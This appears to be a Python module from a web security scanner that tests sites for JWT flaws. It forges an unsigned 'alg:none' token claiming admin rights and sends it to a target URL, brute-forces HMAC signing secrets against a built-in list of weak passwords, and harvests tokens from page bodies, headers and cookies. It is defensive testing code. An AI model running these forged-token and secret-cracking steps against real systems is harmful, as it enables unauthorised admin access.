import base64
import json
import re
import time as _time
from typing import Dict, Optional

import requests

from tools.jwt_common import b64url_decode, decode_jwt_header, decode_jwt_payload
from tools.log_utils import get_logger
from tools.settings import settings

logger = get_logger("jwt_detector")

JWT_REGEX = r"[a-zA-Z0-9_\-]+\.[a-zA-Z0-9_\-]+\.[a-zA-Z0-9_\-]+"

JWT_HEADER_KEYS = ["authorization", "x-jwt", "x-auth-token", "token", "bearer"]

__all__ = ["JWT_REGEX", "JWT_HEADER_KEYS", "decode_jwt_header", "decode_jwt_payload", "check"]


def check_jwt_none(
    sess: requests.Session,
    url: str = None,
    token_header: str = None,
    baseline_status: Optional[int] = None,
) -> Dict:
    result = {"vulnerable": False, "type": None, "evidence": []}
    header = {"alg": "none", "typ": "JWT"}
    payload = {"sub": "admin", "role": "admin", "iat": _time.time()}
    hdr_b64 = base64.urlsafe_b64encode(json.dumps(header).encode()).decode().rstrip("=")
    pld_b64 = base64.urlsafe_b64encode(json.dumps(payload).encode()).decode().rstrip("=")
    token = "%s.%s." % (hdr_b64, pld_b64)

    if url and sess:
        try:
            r = sess.get(url, headers={"Authorization": "Bearer %s" % token}, timeout=10)
            accepted = r.status_code in (200, 201, 204)
            # 带基线时只接受“401/403 被绕过”的明确证据；公开页面返回 200
            # 不能说明 alg:none 被信任。直接调用 check_jwt_none 时保留旧行为。
            if accepted and baseline_status is not None:
                accepted = baseline_status in (401, 403)
            if accepted:
                result["vulnerable"] = True
                result["type"] = "alg_none"
                result["evidence"].append(
                    "alg:none token accepted at %s (status %d)" % (url, r.status_code)
                )
                return result
        except Exception as e:
            logger.debug("jwt none test: %s", e)

    return {
        "vulnerable": False,
        "type": None,
        "evidence": [],
        "token": token,
        "header": header,
        "payload": payload,
        "note": "alg:none token generated - test manually if network test failed",
    }


def check_jwt_weak_secret(token: str, wordlist: list = None) -> Dict:
    if wordlist is None:
        wordlist = [
            "secret",
            "password",
            "123456",
            "admin",
            "key",
            "jwt_secret",
            "supersecret",
            "pass",
            "changeme",
            "1234",
        ]
    result = {"vulnerable": False, "found_secret": None}
    try:
        import hashlib
        import hmac

        parts = token.split(".")
        if len(parts) != 3:
            return result
        message = ("%s.%s" % (parts[0], parts[1])).encode()
        sig_b64 = b64url_decode(parts[2])
        target_sig = sig_b64
        for secret in wordlist:
            expected = hmac.new(secret.encode(), message, hashlib.sha256).digest()
            if hmac.compare_digest(expected, target_sig):
                result["vulnerable"] = True
                result["found_secret"] = secret
                break
    except Exception:
        pass
    return result


def check(
    url: str, param: str = None, sess: Optional[requests.Session] = None, timeout: float = 10.0
) -> Dict:
    if sess is None:
        sess = requests.Session()
    sess.verify = settings.verify_ssl
    result = {"vulnerable": False, "type": None, "tokens_found": [], "findings": []}
    baseline_status = None

    if url:
        try:
            r = sess.get(url, timeout=timeout)
            baseline_status = r.status_code
            for m in re.finditer(JWT_REGEX, r.text):
                token = m.group(0)
                if len(token.split(".")) == 3:
                    payload = decode_jwt_payload(token)
                    hdr = decode_jwt_header(token)
                    entry = {"token": token[:50] + "...", "header": hdr, "payload": payload}
                    result["tokens_found"].append(entry)
                    if payload:
                        if payload.get("role") == "admin" or str(payload.get("sub", "")).startswith(
                            "admin"
                        ):
                            result["findings"].append("high-privilege token found in page body")
                        if hdr and hdr.get("alg") == "none":
                            result["findings"].append("alg:none token header detected in page body")
                        ws = check_jwt_weak_secret(token)
                        if ws["vulnerable"]:
                            result["vulnerable"] = True
                            result["type"] = "weak_secret"
                            result["findings"].append("weak secret: %s" % ws["found_secret"])

            for key, value in r.headers.items():
                lower_key = key.lower()
                if lower_key in JWT_HEADER_KEYS:
                    for m in re.finditer(JWT_REGEX, value):
                        token = m.group(0)
                        if len(token.split(".")) == 3:
                            entry = {"token": token[:50] + "...", "source": "header_%s" % key}
                            result["tokens_found"].append(entry)
                            result["findings"].append("jwt token found in header %s" % key)
                            break

                if lower_key == "set-cookie":
                    for m in re.finditer(JWT_REGEX, value):
                        token = m.group(0)
                        if len(token.split(".")) == 3:
                            entry = {"token": token[:50] + "...", "source": "set-cookie"}
                            result["tokens_found"].append(entry)
                            result["findings"].append("jwt token found in Set-Cookie header")
                            break
        except Exception as e:
            logger.debug("jwt scan: %s", e)

    none_result = check_jwt_none(sess, url, baseline_status=baseline_status)
    if none_result.get("vulnerable"):
        result["vulnerable"] = True
        result["type"] = "alg_none" if not result["type"] else result["type"]
        result["findings"].extend(none_result.get("evidence", []))
    result["alg_none_test"] = none_result

    if not result.get("tokens_found") and not result.get("findings"):
        try:
            for key in JWT_HEADER_KEYS:
                val = r.headers.get(key, "")
                if val and len(val) > 20 and "." in val:
                    logger.debug("potential JWT in header %s: %s...", key, val[:30])
        except Exception:
            pass

    return result
